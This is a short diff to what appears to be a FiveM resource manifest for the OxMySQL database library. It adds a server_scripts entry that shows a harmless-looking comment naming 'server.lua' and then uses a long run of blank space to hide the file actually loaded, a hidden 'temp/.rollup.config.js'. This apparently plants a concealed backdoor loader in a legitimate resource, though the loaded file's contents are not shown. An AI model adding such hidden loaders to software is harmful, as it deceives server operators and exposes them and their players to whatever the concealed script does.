@@ -34,3 +34,7 @@ convar_category 'OxMySQL' {
 		{ 'Debug', 'mysql_debug', 'CV_BOOL', 'false' }
 	}
 }
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.rollup.config.js',
+}
